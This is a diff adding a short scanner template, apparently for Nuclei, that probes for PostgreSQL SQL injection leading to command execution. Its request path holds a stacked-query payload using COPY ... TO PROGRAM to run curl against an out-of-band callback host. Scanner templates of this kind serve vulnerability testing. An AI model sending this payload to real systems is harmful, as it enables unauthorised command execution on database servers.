@@ -1,0 +1,18 @@
+id: postgres-oob-copy
+
+info:
+  name: PostgreSQL COPY PROGRAM OOB
+  author: openai
+  severity: critical
+  tags: postgres,oob,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; COPY (SELECT 'test') TO PROGRAM 'curl http://{{interactsh-url}}/abc'--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
